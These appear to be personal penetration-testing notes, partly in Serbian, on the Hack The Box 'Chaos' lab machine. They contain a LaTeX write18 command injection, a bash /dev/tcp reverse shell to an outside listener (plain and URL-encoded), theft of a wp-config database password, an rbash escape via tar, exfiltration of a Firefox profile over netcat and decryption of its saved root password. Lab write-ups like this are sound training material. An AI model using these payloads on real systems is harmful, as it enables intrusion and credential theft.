+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hr;q=0.8
+Connection: close
+
+content=\immediate\write18{ping -c 1 10.10.14.5}&template=test1 		<- ping -c 1 10.10.14.5 (jeadn ping ka mom racunaru),radi
+
+
+#na mom racunaru
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ sudo tcpdump -i tun0 icmp 	<- pratim icmp saobracaj na tun0 (VPN) interfejsu
+
+Reverse Shell Cheat Sheet
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+Bash
+Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+
+Meaning of bash -i >& /dev/tcp/HOST/PORT 0>&1?
+https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01
+
+This snippet runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>& /dev/tcp/HOST/PORT), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
+
+There is no port forwarding going on. Obviously, a TCP server of some kind has to be listening and accepting connections on that HOST:PORT, and the firewall has to let the connection through.
+
+
+
+#BURP Repeater
+POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1
+Host: chaos.htb
+Content-Length: 193
+Accept: */*
+Origin: http://chaos.htb
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,hr;q=0.8
+Connection: close
+
+content=\immediate\write18{bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1"}&template=test1
+#mora biti URL64 encode-ed
+content=\immediate\write18{%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%2f%39%30%30%31%20%30%3e%26%31%22}&template=test1
+
+#na mom racunaru
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ nc -lvnp 9001
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.120.
+Ncat: Connection from 10.10.10.120:37692.
+bash: cannot set terminal process group (1203): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$  					<- dobio sam reverse shell
+
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+#pyton -c 							<- startuj komandu
+#import pty 						<- importuje pty modul
+#pty.spawn  						<- Spawn a process, and connect its controlling terminal with the current process’s standard io. 
+				   					This is often used to baffle programs which insist on reading from the controlling terminal.	
+#pty.spawn("/bin/bash")'			<- startuje terminal
+
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ python -c 'import pty;pty.spawn("/bin/bash")'
+<pile$ python -c 'import pty;pty.spawn("/bin/bash")'             
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ^Z 		<- Ctrl+Z za bakground
+[1]+  Stopped                 nc -lvnp 9001
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ stty raw -echo 					<- dobijam auto-complete (kucam fg da vratim proces u 
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ nc -lvnp 9001 						foreground)
+
+www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$  cd /var/www/html/wp/wordpress
+www-data@chaos:/var/www/html/wp/wordpress$ cat wp-config.php
+ 
+###
+define('DB_NAME', 'wp');
+
+/** MySQL database username */
+define('DB_USER', 'roundcube');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'inner[OnCag8');
+###
+
+
+www-data@chaos:/var/www/html/wp/wordpress$ cat /etc/passwd
+
+###
+ayush:x:1001:1001:,,,:/home/ayush:/opt/rbash
+###
+
+www-data@chaos:/var/www/html/wp/wordpress$ su - ayush
+Password: 
+ayush@chaos:~$ 
+
+
+#rbash -- the restricted Bourne Again shell
+ayush@chaos:~$ ls 									
+Command 'ls' is available in '/bin/ls'
+The command could not be located because '/bin' is not included in the PATH environment variable.
+ls: command not found
+
+
+ayush@chaos:~$ echo $PATH
+/home/ayush/.app
+
+ayush@chaos:~$ /home/ayush/.app/ 			<- dupli tab da vidimo koje komande imamo
+dir   ping  tar    
+
+
+https://gtfobins.github.io/
+GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+
+The project collects legitimate functions of Unix binaries that can be abused to get the f**k break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+
+
+LOLBAS  															<- slicno za Windows
+Living Off The Land Binaries and Scripts (and also Libraries)
+https://lolbas-project.github.io/
+
+
+https://gtfobins.github.io/gtfobins/tar/
+Shell
+It can be used to break out from restricted environments by spawning an interactive system shell.
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh 						<- bingo
+
+This only works for GNU tar.
+tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
+
+This only works for GNU tar. It can be useful when only a limited command argument injection is available.
+
+TF=$(mktemp)
+echo '/bin/sh 0<&1' > "$TF"
+tar cf "$TF.tar" "$TF"
+tar xf "$TF.tar" --to-command sh
+rm "$TF"*
+
+
+<ull --checkpoint=1 --checkpoint-action=exec=/bin/sh 			<- imamo normalan shell
+tar: Removing leading `/' from member names
+$ export PATH=/bin		
+$ ls
+dir  ping  tar
+
+
+$ cd ~
+$ ls -lah
+total 744K
+drwx------ 6 ayush ayush 4.0K Jun  5 18:33 .
+drwxr-xr-x 4 root  root  4.0K Oct 28  2018 ..
+drwxr-xr-x 2 root  root  4.0K Oct 28  2018 .app
+-rw------- 1 root  root     0 Nov 24  2018 .bash_history
+-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
+-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
+drwx------ 3 ayush ayush 4.0K Jun  4 19:05 .gnupg
+drwx------ 3 ayush ayush 4.0K Jun  5 10:20 mail
+drwx------ 4 ayush ayush 4.0K Sep 29  2018 .mozilla 				<- nista zanimljivo sem Mozilla profila
+-rw-rw-r-- 1 ayush ayush 701K Jun  5 18:33 mozi.tar.gz
+-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
+-rw------- 1 ayush ayush   33 Oct 28  2018 user.txt
+
+
+$ tar -zcvf /dev/shm/mozilla.tar.gz .mozilla 						<- arhiva Mozilla profila koja treba da se kopira na moj racunar
+$ ls /dev/shm
+mozilla.tar.gz
+
+#Chaos masina
+$ nc 10.10.14.5 9001 < /dev/shm/mozilla.tar.gz
+
+#mozemo da iskoristimo md5sum da proverimo da li je fajl pravilno kopiran
+#moja masina
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ nc -lvnp 9001 > mozilla.tar.gz
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.120.
+Ncat: Connection from 10.10.10.120:37694.
+^C
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ file *
+chaos.txt:      UTF-8 Unicode text, with very long lines
+enim_msg.txt:   data
+en.py:          Python script, UTF-8 Unicode text executable
+mozilla.tar.gz: gzip compressed data, last modified: Thu Jun  6 13:44:16 2019, from Unix, original size 14817280
+sjelicic@Laki:~/pCloudDrive/OSCP/HTB/Chaos$ tar -zxvf mozilla.tar.gz 
+
+
+Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles
+https://github.com/unode/firefox_decrypt
+
+sjelicic@Laki:/opt$ sudo git clone https://github.com/unode/firefox_decrypt.git
+[sudo] password for sjelicic: 
+Cloning into 'firefox_decrypt'...
+remote: Enumerating objects: 4, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 815 (delta 0), reused 1 (delta 0), pack-reused 811
+Receiving objects: 100% (815/815), 300.50 KiB | 1005.00 KiB/s, done.
+Resolving deltas: 100% (490/490), done.
+
+
+sjelicic@Laki:/opt/firefox_decrypt$ python firefox_decrypt.py ~/pCloudDrive/OSCP/HTB/Chaos/.mozilla/firefox/
+
+Master Password for profile /home/sjelicic/pCloudDrive/OSCP/HTB/Chaos/.mozilla/firefox/bzo7sjt1.default:  		<- pass is jiujitsu for 
+																												   ashay user profile
+Website:   https://chaos.htb:10000
+Username: 'root'
+Password: 'Thiv8wrej~'
+
+
+
